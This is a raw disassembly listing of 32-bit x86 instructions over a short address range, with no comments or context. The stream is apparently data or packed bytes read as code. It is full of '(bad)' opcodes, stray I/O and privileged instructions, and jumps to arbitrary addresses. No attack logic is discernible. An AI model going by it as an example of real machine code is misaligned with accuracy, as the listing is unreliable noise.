  4215ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215cf:	sbb    BYTE PTR [esi],dl
  4215d1:	jmp    DWORD PTR [esi-0x80]
  4215d4:	ins    DWORD PTR es:[edi],dx
  4215d5:	lds    ebx,FWORD PTR [esp+edi*8+0x13]
  4215d9:	mov    ah,0x36
  4215db:	add    DWORD PTR [ecx+esi*2-0x33a4f76c],eax
  4215e2:	fnsave [esi-0x72]
  4215e5:	aam    0x55
  4215e7:	adc    eax,0x410db36d
  4215ec:	ins    BYTE PTR es:[edi],dx
  4215ed:	fmul   st(4),st
  4215ef:	push   ebx
  4215f0:	xor    BYTE PTR [ebx+ebx*1-0x7c],ah
  4215f4:	test   eax,0x6ebd9867
  4215f9:	(bad)  
  4215fa:	xor    ebp,edi
  4215fc:	and    ah,BYTE PTR [edi-0x91fd88]
  421602:	clc    
  421603:	ret    0x70fa
  421606:	and    DWORD PTR [eax],esi
  421608:	in     al,0xec
  42160a:	or     eax,0xd2cdb194
  42160f:	mov    WORD PTR ds:0xb58dd561,es
  421615:	ret    
  421616:	mov    DWORD PTR [ebp-0x3fea48e1],eax
  42161c:	push   ebp
  42161d:	(bad)  
  42161e:	push   0x3c8a6c79
  421623:	test   eax,0x5403066f
  421628:	mov    eax,0x156a47eb
  42162d:	hlt    
  42162e:	aas    
  42162f:	bound  ecx,QWORD PTR [edi+edx*2-0x12]
  421633:	xor    DWORD PTR [eax+0x19b92c0],esi
  421639:	test   al,0xe4
  42163b:	scas   al,BYTE PTR es:[edi]
  42163c:	cmp    al,0x52
  42163e:	pushf  
  42163f:	xchg   edi,eax
  421640:	push   cs
  421641:	retf   
  421642:	jns    0x42162f
  421644:	(bad)  [esi]
  421646:	mov    al,0xb1
  421648:	dec    eax
  421649:	cli    
  42164a:	adc    eax,0xae6dc5ae
  42164f:	daa    
  421650:	jnp    0x421626
  421652:	sbb    ebp,DWORD PTR [eax+ebp*8+0x7a328d0a]
  421659:	jae    0x421681
  42165b:	pop    ebx
  42165c:	add    bh,ch
  42165e:	jmp    0xdf4b0b1c
  421663:	jmp    0x67993571
  421668:	in     eax,dx
  421669:	mov    dh,0x1c
  42166b:	xor    DWORD PTR [edi+0x33],eax
  42166e:	adc    BYTE PTR [ebp-0xd],0xcc
  421672:	loopne 0x421626
  421674:	and    dl,BYTE PTR [ecx-0x2b581dba]
  42167a:	mov    ch,dl
  42167c:	adc    ah,bl
  42167e:	adc    eax,DWORD PTR [esi-0x30]
  421681:	pop    ecx
  421682:	ins    BYTE PTR es:[edi],dx
  421683:	xchg   esi,eax
  421684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421685:	sub    eax,DWORD PTR [ebp+0xe26786c]
  42168b:	clc    
  42168c:	adc    bh,BYTE PTR [ebx-0x7395d23]
  421692:	jp     0x4216af
  421694:	inc    ebp
  421695:	add    eax,DWORD PTR [ecx-0x7f]
  421698:	mov    edx,0x38cd54de
  42169d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42169e:	fldenv [ecx]
  4216a0:	fs jmp 0x233e:0xe61e3438
  4216a8:	int    0xf0
  4216aa:	stos   DWORD PTR es:[edi],eax
  4216ab:	sub    bl,ch
  4216ad:	out    dx,eax
  4216ae:	cwde   
  4216af:	dec    esp
  4216b0:	sbb    dl,BYTE PTR [ecx+eiz*2+0x61]
  4216b4:	jnp    0x42166e
  4216b6:	pop    ecx
  4216b7:	fidiv  DWORD PTR [esi+0x44657025]
  4216bd:	int3   
  4216be:	out    0x40,al
  4216c0:	adc    BYTE PTR [ebx+0x28],al
  4216c3:	icebp  
  4216c4:	nop
  4216c5:	sub    BYTE PTR [ecx-0x679893bf],al
  4216cb:	aas    
  4216cc:	out    0x19,al
  4216ce:	popf   
  4216cf:	(bad)  
  4216d1:	test   DWORD PTR [edx-0x2f0f5fda],ebp
  4216d7:	retf   
  4216d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216d9:	sub    esp,ecx
  4216db:	pop    es
  4216dc:	loopne 0x42170e
  4216de:	mov    bh,0x2f
  4216e0:	push   esp
  4216e1:	leave  
  4216e2:	or     al,0xc1
  4216e4:	sub    BYTE PTR [ecx+ecx*4+0x54c6f88d],dl
  4216eb:	xor    esp,DWORD PTR [ebx+ebp*2+0x53]
  4216ef:	neg    dl
  4216f1:	fisubr DWORD PTR [ecx+0x3034aef]
  4216f7:	inc    eax
  4216f8:	xlat   BYTE PTR ds:[ebx]
  4216f9:	fs lahf 
  4216fb:	add    DWORD PTR [edi-0x31c79dcc],edi
  421701:	ins    DWORD PTR es:[edi],dx
  421702:	dec    ecx
  421703:	sbb    dl,al
  421705:	and    dl,BYTE PTR ds:0x9683dcfd
  42170b:	icebp  
  42170c:	or     DWORD PTR [eax-0x77],ebx
  42170f:	sub    BYTE PTR [eax-0x779ed059],ch
  421715:	sub    BYTE PTR [ecx],0xa7
  421718:	dec    esi
  421719:	sbb    esp,0x9120ffc2
  42171f:	cmp    BYTE PTR [eax+eax*8+0x43],0xa5
  421724:	mov    esp,0x21e339c2
  421729:	mov    DWORD PTR [ecx-0x2ac52bf4],edx
  42172f:	jns    0x4216b6
  421731:	shl    dh,cl
  421733:	and    BYTE PTR [eax-0xd],ch
  421736:	adc    edx,DWORD PTR [ebp-0x74d24e98]
  42173c:	test   BYTE PTR [ebx+ebp*4],cl
  42173f:	xchg   edi,eax
  421740:	stc    
  421741:	and    BYTE PTR [eax+0x1a],dh
  421744:	dec    esi
  421745:	and    al,0xf4
  421747:	popf   
  421748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421749:	gs dec ebp
  42174b:	sub    dl,BYTE PTR [esi]
  42174d:	cmp    al,0xa0
  42174f:	cld    
  421750:	stc    
  421751:	xrelease mov BYTE PTR ss:[ebx+ebx*8],0x6
  421757:	data16 outs dx,BYTE PTR ds:[esi]
  421759:	adc    BYTE PTR [edx+0x5a780b5a],0x38
  421760:	mov    esp,DWORD PTR [ecx+0x36a2f9f8]
  421766:	mov    esp,0x2bfb7d89
  42176b:	inc    eax
  42176c:	cmp    BYTE PTR [ebx],bh
  42176e:	(bad)  
  42176f:	cmp    ecx,esi
  421771:	xchg   esi,eax
  421772:	sub    eax,0x5097fd06
  421777:	jo     0x4217b8
  421779:	jge    0x4217b3
  42177b:	xchg   edi,eax
  42177c:	push   es
  42177d:	fld    DWORD PTR [ecx+0x6bf7a659]
  421783:	popa   
  421784:	stos   DWORD PTR es:[edi],eax
  421785:	jl     0x42178f
  421787:	jae    0x4217df
  421789:	and    BYTE PTR [esi-0x57],dl
  42178c:	pop    es
  42178d:	dec    eax
  42178e:	les    edi,FWORD PTR [ecx-0x481e64c7]
  421794:	xchg   edi,eax
  421795:	clc    
  421796:	jae    0x421792
  421798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421799:	adc    DWORD PTR [ebx+edx*4-0x42631edb],ebp
  4217a0:	adc    al,0xd8
  4217a2:	(bad)  
  4217a4:	mul    DWORD PTR [ecx-0x49]
  4217a7:	in     eax,dx
  4217a8:	mov    bl,0x35
  4217aa:	cli    
  4217ab:	pop    ss
  4217ac:	add    al,0xa5
  4217ae:	xor    edi,DWORD PTR [ebp+0x2d]
  4217b1:	mov    bl,0xdb
  4217b3:	xchg   ebp,eax
  4217b4:	jne    0x4217d0
  4217b6:	xchg   esi,eax
  4217b7:	push   ds
  4217b8:	and    esi,DWORD PTR [eax]
  4217ba:	inc    esi
  4217bb:	out    dx,eax
  4217bc:	push   ebp
  4217bd:	jmp    0x830918c3
  4217c2:	mov    ds:0x238da0c4,eax
  4217c7:	ins    BYTE PTR es:[edi],dx
  4217c8:	fist   WORD PTR [edx+0x14]
  4217cb:	cwde   
  4217cc:	test   BYTE PTR [esi],bl
  4217ce:	xchg   ebp,eax
  4217cf:	loop   0x4217c3
  4217d1:	push   0x42
  4217d3:	xchg   BYTE PTR [ebx],bh
  4217d5:	repnz sbb BYTE PTR gs:[esp+eiz*8+0x7c],dh
  4217db:	cwde   
  4217dc:	aad    0x7
  4217de:	jl     0x4217de
  4217e0:	pop    edx
  4217e1:	cmp    DWORD PTR [esi],ecx
  4217e3:	fmulp  st(2),st
  4217e5:	fiadd  WORD PTR [edx+0x60cb231d]
  4217eb:	fcmovne st,st(2)
  4217ed:	mov    al,0x63
  4217ef:	mov    ah,0x93
  4217f1:	retf   0x4e72
  4217f4:	dec    edx
  4217f5:	mov    ebp,DWORD PTR [ecx-0x571b4bb6]
  4217fb:	sahf   
  4217fc:	out    0x2c,al
  4217fe:	retf   0x53e8
  421801:	cmp    eax,DWORD PTR [ebx]
  421803:	push   cs
  421804:	xchg   ebx,eax
  421805:	pop    eax
  421806:	mov    esi,0x25d0bdb2
  42180b:	jl     0x42180e
  42180d:	int    0x7
  42180f:	xor    al,BYTE PTR ds:0x69ed9bdb
  421815:	sbb    al,0x8e
  421817:	fwait
  421818:	add    cl,bl
  42181a:	adc    BYTE PTR [esi],dh
  42181c:	sbb    BYTE PTR ss:[esi-0x2e],0xf9
  421821:	icebp  
  421822:	repz jns 0x421887
  421825:	adc    al,0x52
  421827:	or     ecx,esi
  421829:	mov    dh,0xd5
  42182b:	add    DWORD PTR ds:0x967beeaa,edi
  421831:	xor    ch,BYTE PTR [ebx]
  421833:	pop    ecx
  421834:	adc    BYTE PTR [eax-0x2],0x15
  421838:	jge    0x4218b8
  42183a:	mov    esp,0xf0a2cf68
  42183f:	mul    esp
  421841:	lock jne 0x421891
  421844:	xchg   bl,bl
  421846:	xchg   DWORD PTR [ecx],ebx
  421848:	mov    edi,0xda2c208
  42184d:	push   ss
  42184e:	jl     0x42187e
  421850:	stos   BYTE PTR es:[edi],al
  421851:	(bad)  
  421853:	mov    edx,0x4a52c396
  421858:	in     eax,0x72
  42185a:	adc    esi,eax
  42185c:	sbb    eax,0x2ad6fc2
  421861:	(bad)  
  421862:	inc    esp
  421863:	sbb    ebp,DWORD PTR [ecx]
  421865:	sbb    BYTE PTR [esi],0xaa
  421868:	fs push edi
  42186a:	ins    DWORD PTR es:[edi],dx
  42186b:	imul   edi,DWORD PTR [eax-0x7087372e],0x3a91526f
  421875:	inc    ecx
  421876:	inc    esp
  421877:	mov    eax,0x1985fde1
  42187c:	push   ebx
  42187d:	push   0xffffffa2
  42187f:	shl    BYTE PTR [esi],0x93
  421882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421883:	mov    esp,0x724bfc08
  421888:	dec    ebp
  421889:	ret    
  42188a:	dec    ebp
  42188b:	mov    dl,BYTE PTR [ebx+0x77]
  42188e:	mov    bh,0xec
  421890:	push   ds
  421891:	fisub  WORD PTR [esi]
  421893:	xor    BYTE PTR [edi-0x203a1f46],al
  421899:	outs   dx,BYTE PTR ds:[esi]
  42189a:	mov    esi,0x5f179df
  42189f:	data16 mov al,ds:0x64ba7fb9
  4218a5:	mov    esp,0x3c037107
  4218aa:	jmp    0x421916
  4218ac:	ss out dx,al
  4218ae:	pop    eax
  4218af:	test   eax,0xaefcac05
  4218b4:	test   bh,0x29
  4218b7:	test   DWORD PTR [ecx],esp
  4218b9:	pop    ecx
  4218ba:	mov    edx,0x5bf1da2d
  4218bf:	push   edi
  4218c0:	sbb    DWORD PTR [ebp-0x49],0x6b
  4218c4:	cld    
  4218c5:	lods   eax,DWORD PTR ds:[esi]
  4218c6:	cmp    eax,eax
  4218c8:	pop    edx
  4218c9:	add    ebp,edi
  4218cb:	idiv   DWORD PTR [esi-0x7fc4cc0b]
  4218d1:	inc    edi
  4218d2:	mov    edx,0xbae7cbe3
  4218d7:	push   0x6436efd3
  4218dc:	or     eax,0x8641ec24
  4218e1:	jmp    0xae1021ee
  4218e6:	rcl    DWORD PTR [esi+ecx*4+0x5c],1
  4218ea:	push   esp
  4218eb:	cmp    eax,ecx
  4218ed:	es stos DWORD PTR es:[edi],eax
  4218ef:	inc    esi
  4218f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218f1:	push   esi
  4218f2:	inc    esi
  4218f3:	xor    esp,DWORD PTR [edi+0x7b]
  4218f6:	jo     0x4218fc
  4218f8:	fild   WORD PTR [ebp-0x45]
  4218fb:	inc    ebp
  4218fc:	xchg   esi,eax
  4218fd:	push   edi
  4218fe:	adc    BYTE PTR [edi-0x42bd8728],0x1c
  421905:	mov    ecx,0x3768d91d
  42190a:	inc    ebp
  42190b:	mov    esp,0x4706abd
  421910:	adc    BYTE PTR [edi],al
  421912:	and    al,0xdb
  421914:	jo     0x42193a
  421916:	xchg   DWORD PTR [edx+ebp*8+0x17],ecx
  42191a:	pusha  
  42191b:	push   ss
  42191c:	pop    ds
  42191d:	je     0x4218f0
  42191f:	shl    esp,1
  421921:	ins    BYTE PTR es:[edi],dx
  421922:	mov    dl,0x89
  421924:	jno    0x42195f
  421926:	sub    al,BYTE PTR [edi]
  421928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421929:	arpl   WORD PTR [esi-0x4d89f98f],dx
  42192f:	add    BYTE PTR [esp+eax*2-0x2f],0x94
  421934:	cmp    esi,DWORD PTR [edi-0x25b54890]
  42193a:	mov    edx,0x19b0bb56
  42193f:	sbb    cl,BYTE PTR [ebp-0x6204eb2c]
  421945:	jns    0x421910
  421947:	sbb    eax,0x8ac32141
  42194c:	mov    ?,WORD PTR [ebx+0x59c7573f]
  421952:	leave  
  421953:	xchg   ecx,eax
  421954:	mov    edx,0x18c54296
  421959:	sbb    DWORD PTR [edi+0x9],ebx
  42195c:	jne    0x4218f8
  42195e:	mov    bh,0xb1
  421960:	and    eax,0x18eea9c3
  421965:	sub    al,0x65
  421967:	loope  0x421964
  421969:	push   ss
  42196a:	jae    0x42198f
  42196c:	add    eax,0xa8415be4
  421971:	push   ebx
  421972:	mov    al,bh
  421974:	mov    bh,0x0
  421976:	jle    0x421920
  421978:	std    
  421979:	xchg   esp,eax
  42197a:	in     al,0x2c
  42197c:	sbb    BYTE PTR [ecx],bl
  42197e:	adc    ebx,esp
  421980:	call   0x423bc016
  421985:	jae    0x42199e
  421987:	adc    BYTE PTR [esi-0x38b72d33],ah
  42198d:	out    0xf,eax
  42198f:	push   ebp
  421990:	cmp    ebp,ebx
  421992:	ins    DWORD PTR es:[edi],dx
  421993:	pop    edi
  421994:	ror    DWORD PTR [edi],0x4e
  421997:	fcmovnbe st,st(3)
  421999:	or     eax,DWORD PTR [eax]
  42199b:	cmc    
  42199c:	inc    ebp
  42199d:	into   
  42199e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42199f:	inc    eax
  4219a0:	sbb    eax,0x1d3ab5ba
  4219a5:	mov    ecx,?
  4219a7:	xchg   DWORD PTR [ecx-0x4718b1f],edi
  4219ad:	into   
  4219ae:	fbld   TBYTE PTR fs:[ecx]
  4219b1:	xor    ebp,ebp
  4219b3:	ss mov ebp,0xbca03137
  4219b9:	sbb    al,0x4e
  4219bb:	mov    al,ds:0xac3d1c26
  4219c0:	int    0x67
  4219c2:	int    0x9c
  4219c4:	push   ebx
  4219c5:	add    eax,DWORD PTR [ebp-0x4adf4d30]
  4219cb:	sbb    al,0x32
  4219cd:	pop    eax
  4219ce:	int3   
  4219cf:	rcl    DWORD PTR [edx+0x79b70709],0xf3
  4219d6:	ret    
  4219d7:	jnp    0x4219db
  4219d9:	retf   0x3032
  4219dc:	mov    eax,ds:0xea1b6a7a
  4219e1:	jl     0x4219c7
  4219e3:	xchg   ebp,eax
  4219e4:	sbb    eax,0x71c894cc
  4219e9:	hlt    
  4219ea:	ficom  WORD PTR [ecx]
  4219ec:	xchg   edi,eax
  4219ed:	mov    esp,0x9d6edf63
  4219f2:	xchg   ebx,eax
  4219f3:	repnz test ebp,0x52654619
  4219fa:	in     al,dx
  4219fb:	(bad)  
  4219fc:	repz pushf 
  4219fe:	xor    dl,ah
  421a00:	or     BYTE PTR [edx],bh
  421a02:	icebp  
  421a03:	jp     0x421a17
  421a05:	retf   0x1f8f
  421a08:	xchg   edi,eax
  421a09:	jno    0x4219b9
  421a0b:	jp     0x421a44
  421a0d:	jp     0x4219bc
  421a0f:	cld    
  421a10:	push   esi
  421a11:	pop    es
  421a12:	div    DWORD PTR [esi+0x33]
  421a15:	sub    ecx,ecx
  421a17:	push   esi
  421a18:	and    cl,al
  421a1a:	cmp    BYTE PTR [eax+0x5],dh
  421a1d:	sbb    bh,ah
  421a1f:	adc    BYTE PTR [eax+0x24f91d34],ah
  421a25:	push   ecx
  421a26:	or     eax,0xbbbe78bf
  421a2b:	xchg   BYTE PTR [ebx+edi*4],ah
  421a2e:	fs out 0x13,al
  421a31:	arpl   WORD PTR [eax],bp
  421a33:	pushf  
  421a34:	jb     0x4219dc
  421a36:	or     eax,0xb4917e68
  421a3b:	dec    eax
  421a3c:	iret   
  421a3d:	(bad)  
  421a3e:	int3   
  421a3f:	mov    ds:0x51a673d7,al
  421a44:	and    ebx,0x58
  421a47:	cmp    cl,BYTE PTR [ebp+0x72]
  421a4a:	adc    BYTE PTR [ebp-0x68],bh
  421a4d:	xor    BYTE PTR [ebx],bl
  421a4f:	mov    esi,0xdd1db1c3
  421a54:	push   ebx
  421a55:	aam    0xb1
  421a57:	xor    eax,DWORD PTR [edx-0x31]
  421a5a:	cmp    bl,0x35
  421a5d:	push   es
  421a5e:	rcr    esp,1
  421a60:	fsub   QWORD PTR [esi+eax*4]
  421a63:	mov    ch,0x46
  421a65:	pop    esp
  421a66:	mov    ebp,0x49f142a8
  421a6b:	shl    BYTE PTR [ebp+0x6c],1
  421a6e:	xor    ecx,DWORD PTR [esi-0x55]
  421a71:	xchg   edx,eax
  421a72:	mov    al,ds:0xd325214a
  421a77:	nop
  421a78:	fsub   QWORD PTR [ecx-0x63b9ee06]
  421a7e:	jl     0x421a74
  421a80:	mov    WORD PTR [eax+0x4a],fs
  421a83:	xchg   edi,eax
  421a84:	jb     0x421a25
  421a86:	das    
  421a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a88:	or     DWORD PTR [ebx+0x7a40d9b7],ecx
  421a8e:	xor    bh,0xce
  421a91:	inc    edx
  421a92:	cmc    
  421a93:	add    edi,ebx
  421a95:	int3   
  421a96:	test   eax,0xdc6de7f6
  421a9b:	inc    ecx
  421a9c:	mov    bl,0xb3
  421a9e:	sbb    dh,dh
  421aa0:	mov    ds:0x8e18d11b,eax
  421aa5:	sub    al,BYTE PTR [ebp-0x5b657af6]
  421aab:	sub    eax,0x3c33cab8
  421ab0:	(bad)  
  421ab2:	sub    DWORD PTR [ebp-0x45],esp
  421ab5:	add    DWORD PTR [ecx],eax
  421ab7:	cmp    al,0xc6
  421ab9:	mov    ecx,0xa3d55966
  421abe:	sub    bl,0x96
  421ac1:	popa   
  421ac2:	xchg   esp,eax
  421ac3:	ror    edi,cl
  421ac5:	lods   eax,DWORD PTR ds:[esi]
  421ac6:	mov    eax,ds:0x3d0e1932
  421acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421acc:	jmp    0x951f9288
  421ad1:	sbb    DWORD PTR [ebp-0x5cbceada],eax
  421ad7:	retf   
  421ad8:	fwait
  421ad9:	mov    DWORD PTR [eax],ebx
  421adb:	(bad)  
  421adc:	call   0x40fe085a
  421ae1:	jbe    0x421b61
  421ae3:	mov    bh,0x13
  421ae5:	jo     0x421adf
  421ae7:	pop    edi
  421ae8:	pop    ebp
  421ae9:	rol    ecx,1
  421aeb:	inc    ebx
  421aec:	leave  
  421aed:	cmp    DWORD PTR [esp+edx*1],0xffffffe4
  421af1:	adc    DWORD PTR [edx+esi*8+0x6d],0xffffff9f
  421af6:	scas   eax,DWORD PTR es:[edi]
  421af7:	cmp    DWORD PTR [edx-0x5f14b208],ebx
  421afd:	mov    cl,0xd5
  421aff:	cmp    BYTE PTR [eax+esi*4+0xd],0x17
  421b04:	add    DWORD PTR [edx-0x6e],ebp
  421b07:	les    esp,FWORD PTR [esi-0xcbbf86f]
  421b0d:	ror    edx,1
  421b0f:	fisub  DWORD PTR ss:[esi+0x67c14545]
  421b16:	lods   al,BYTE PTR ds:[esi]
  421b17:	jl     0x421b06
  421b19:	cli    
  421b1a:	push   edx
  421b1b:	xchg   BYTE PTR [ebp-0x31],bh
  421b1e:	mov    ebp,0x7d28d45c
  421b23:	imul   esi,DWORD PTR [ebx],0x88401676
  421b29:	fist   WORD PTR [ecx-0x37e73782]
  421b2f:	sar    DWORD PTR [ebp-0x36],1
  421b32:	xchg   ebx,eax
  421b33:	sbb    eax,0x9d946230
  421b38:	fsub   DWORD PTR [edi]
  421b3a:	jmp    0x70807489
  421b3f:	xchg   bl,ah
  421b41:	cmp    al,0x88
  421b43:	jne    0x421b83
  421b45:	shl    BYTE PTR [edx],0x48
  421b48:	sbb    ah,BYTE PTR [edi]
  421b4a:	xor    al,0xbd
  421b4c:	mov    ebx,0xd117ea96
  421b51:	shl    DWORD PTR [edx+0x1f],cl
  421b54:	retf   0xff8c
  421b57:	inc    ecx
  421b58:	ds in  eax,0x17
  421b5b:	sub    ah,dh
  421b5d:	mov    bl,0xa8
  421b5f:	das    
  421b60:	into   
  421b61:	push   esi
  421b62:	(bad)  
  421b63:	xchg   esp,eax
  421b64:	dec    esi
  421b65:	das    
  421b66:	call   0xf10e465e
  421b6b:	aad    0xd0
  421b6d:	in     eax,dx
  421b6e:	cmp    ecx,DWORD PTR ds:0xe4c3e8e1
  421b74:	jmp    FWORD PTR [edi-0x6e6ba6e8]
  421b7a:	imul   ebp,DWORD PTR [ebx],0xffffffce
  421b7d:	cli    
  421b7e:	cmp    ecx,edx
  421b80:	es push edi
  421b82:	sbb    eax,0x392fac53
  421b87:	jo     0x421b3e
  421b89:	je     0x421ba1
  421b8b:	inc    ecx
  421b8c:	adc    eax,0xd5ca23b7
  421b91:	pop    ebp
  421b92:	sbb    dl,cl
  421b94:	(bad)  
  421b95:	loope  0x421b20
  421b97:	mov    edi,0x5c7b43b8
  421b9c:	jne    0x421b84
  421b9e:	std    
  421b9f:	retf   
  421ba0:	gs call 0x58c:0x6c77659e
  421ba8:	push   ds
  421ba9:	mov    ebx,0xb6cd1625
  421bae:	or     dl,BYTE PTR [esi+0x63]
  421bb1:	ror    BYTE PTR ds:[ebp-0x31],0xeb
  421bb6:	pop    eax
  421bb7:	mov    eax,0x2237e2a2
  421bbc:	mov    bh,cl
  421bbe:	mov    bl,dl
  421bc0:	rcl    BYTE PTR [ebx],cl
  421bc2:	data16 (bad) 
  421bc4:	cmp    eax,0x4a6f8285
  421bc9:	pusha  
  421bca:	scas   eax,DWORD PTR es:[edi]
  421bcb:	add    cl,BYTE PTR [edx]
  421bcd:	div    BYTE PTR [ecx+0xc07bac6]
  421bd3:	and    DWORD PTR [ecx+ebp*4-0x5cd2d4ac],edx
  421bda:	fcom   DWORD PTR [edi]
  421bdc:	dec    ebp
  421bdd:	ficom  DWORD PTR [esp+esi*8]
  421be0:	xchg   ebx,eax
  421be1:	fs in  al,0xa8
  421be4:	das    
  421be5:	loop   0x421bd2
  421be7:	dec    esi
  421be8:	or     ebp,esp
  421bea:	clc    
  421beb:	mov    esi,DWORD PTR [edx]
  421bed:	ja     0x421b90
  421bef:	sub    eax,0x70097956
  421bf4:	in     eax,dx
  421bf5:	dec    eax
  421bf6:	ret    
  421bf7:	xchg   ecx,eax
  421bf8:	dec    ebx
  421bf9:	xlat   BYTE PTR ds:[ebx]
  421bfa:	sbb    ebp,DWORD PTR [ecx+0x72]
  421bfd:	fs das 
  421bff:	adc    al,0xed
  421c01:	jnp    0x421bae
  421c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c04:	retf   
  421c05:	xchg   esi,eax
  421c06:	test   eax,0x81e7a231
  421c0b:	sbb    eax,0x501ec3d9
  421c10:	dec    ebp
  421c11:	fwait
  421c12:	and    bl,BYTE PTR [esi-0x707fbc80]
  421c18:	xor    al,0x20
  421c1a:	sti    
  421c1b:	daa    
  421c1c:	xchg   ecx,eax
  421c1d:	les    ebp,FWORD PTR [eax-0x36]
  421c20:	pop    esp
  421c21:	adc    eax,0x426866f0
  421c26:	into   
  421c27:	sahf   
  421c28:	(bad)  
  421c29:	push   ebx
  421c2a:	push   0xa92faebe
  421c2f:	loopne 0x421c83
  421c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c32:	(bad)  
  421c33:	(bad)  
  421c34:	cdq    
  421c35:	sar    BYTE PTR [eax+0x4d82f126],cl
  421c3b:	xchg   ecx,esi
  421c3d:	push   edi
  421c3e:	adc    DWORD PTR [ebp-0x7c],edx
  421c41:	hlt    
  421c42:	dec    ecx
  421c43:	dec    esi
  421c44:	xchg   BYTE PTR [ecx+0x6211b449],ch
  421c4a:	in     ax,0x86
  421c4d:	push   esp
  421c4e:	or     DWORD PTR [edx-0x70a4a6f3],esp
  421c54:	fwait
  421c55:	jle    0x421c1c
  421c57:	call   0x7243:0x2e717d0c
  421c5e:	xor    eax,0x600577b
  421c63:	push   ebp
  421c64:	pop    ebx
  421c65:	push   es
  421c66:	gs dec edx
  421c68:	dec    edx
  421c69:	out    dx,eax
  421c6a:	mov    ch,bl
  421c6c:	(bad)  
  421c6d:	add    BYTE PTR [ebx],ch
  421c6f:	out    dx,al
  421c70:	mov    dh,0x58
  421c72:	sbb    al,0x2e
  421c74:	push   eax
  421c75:	cmp    al,0x5a
  421c77:	pushf  
  421c78:	push   ebp
  421c79:	xor    dl,BYTE PTR [ebx+0x266b4a1e]
  421c7f:	xor    ebp,DWORD PTR [ebp+0x5ac0f82]
  421c85:	jo     0x421c69
  421c87:	pop    ebp
  421c88:	mov    ebp,0x5f09ce5c
  421c8d:	pop    DWORD PTR [ebx]
  421c8f:	sub    al,0xa4
  421c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c92:	in     eax,0x28
  421c94:	jae    0x421c41
  421c96:	pop    esp
  421c97:	jp     0x421ccc
  421c99:	lods   eax,DWORD PTR ds:[esi]
  421c9a:	pop    ebx
  421c9b:	jecxz  0x421c87
  421c9d:	stos   DWORD PTR es:[edi],eax
  421c9e:	shl    DWORD PTR es:[ebp-0x4a],0x2
  421ca3:	sbb    al,0xcf
  421ca5:	inc    esp
  421ca6:	(bad)  
  421ca7:	mov    esp,0xdce472cf
  421cac:	adc    eax,0x76d032f5
  421cb1:	push   ebx
  421cb2:	inc    ebp
  421cb3:	lock loop 0x421c4f
  421cb6:	scas   al,BYTE PTR es:[edi]
  421cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cb8:	aas    
  421cb9:	dec    ecx
  421cba:	or     DWORD PTR [edx],edx
  421cbc:	sub    ebp,DWORD PTR [ebx+0x766c824c]
  421cc2:	mov    ds:0x15e2a44b,al
  421cc7:	sbb    eax,0x15fef5d0
  421ccc:	xor    esi,esi
  421cce:	xchg   esp,eax
  421ccf:	sbb    DWORD PTR [ebx],0xffffffc5
  421cd2:	aad    0x2
  421cd4:	dec    esi
  421cd5:	xchg   edi,eax
  421cd6:	retf   0xf7b3
  421cd9:	jp     0x421d27
  421cdb:	aam    0xef
  421cdd:	mov    edi,esp
  421cdf:	cli    
  421ce0:	repz xchg edx,eax
  421ce2:	dec    esp
  421ce3:	and    BYTE PTR [edx+0x3f],dh
  421ce6:	xor    al,0x1f
  421ce8:	pop    edi
  421ce9:	arpl   WORD PTR [edi+0x1feaf212],bx
  421cef:	fisub  WORD PTR [edi]
  421cf1:	pop    ecx
  421cf2:	jbe    0x421cab
  421cf4:	std    
  421cf5:	mov    ah,0x7d
  421cf7:	scas   al,BYTE PTR es:[edi]
  421cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cf9:	cmp    ah,BYTE PTR [esi+0x5a128008]
  421cff:	xchg   DWORD PTR [ecx-0x29],ebp
  421d02:	ins    DWORD PTR es:[edi],dx
  421d03:	sbb    bl,BYTE PTR [edx]
  421d05:	sub    esi,DWORD PTR [ebx]
  421d07:	push   edi
  421d08:	jb     0x421cbc
  421d0a:	ins    DWORD PTR es:[edi],dx
  421d0b:	push   cs
  421d0c:	enter  0xb05,0x26
  421d10:	or     eax,0xd263737b
  421d15:	mov    ebp,0xfa6ac1a9
  421d1a:	inc    ecx
  421d1b:	(bad)  
  421d1c:	push   0x2916cf68
  421d21:	sub    ah,BYTE PTR [ecx]
  421d23:	pop    es
  421d24:	bound  esi,QWORD PTR [edi]
  421d26:	and    BYTE PTR [edi+edx*2],al
  421d29:	ss add eax,0x4c589e48
  421d2f:	rcl    DWORD PTR [ecx+0x3b],cl
  421d32:	jle    0x421cee
  421d34:	dec    edx
  421d35:	repnz gs leave 
  421d38:	sbb    eax,0x1484cebf
  421d3d:	aad    0x4d
  421d3f:	and    DWORD PTR [edi-0x6928f9ca],edx
  421d45:	hlt    
  421d46:	sub    DWORD PTR [eax],esp
  421d48:	mov    ecx,0x50cd0974
  421d4d:	imul   BYTE PTR [edx+0x2ae03844]
  421d53:	ficom  WORD PTR [ebx-0x977881e]
  421d59:	jns    0x421d53
  421d5b:	pop    ss
  421d5c:	in     al,0x7
  421d5e:	dec    esi
  421d5f:	push   edi
  421d60:	out    0x72,al
  421d62:	cmp    DWORD PTR [esi],ecx
  421d64:	pop    ecx
  421d65:	sbb    ch,BYTE PTR [ebp+0x1436872e]
  421d6b:	push   cs
  421d6c:	and    al,0x7
  421d6e:	inc    esp
  421d6f:	sub    DWORD PTR [edi+0x23],eax
  421d72:	inc    ecx
  421d73:	(bad)  
  421d74:	stos   DWORD PTR es:[edi],eax
  421d75:	inc    ecx
  421d76:	add    eax,0xf2fcc896
  421d7b:	sbb    al,BYTE PTR [edi+edx*4]
  421d7e:	cmp    eax,0x7445c92b
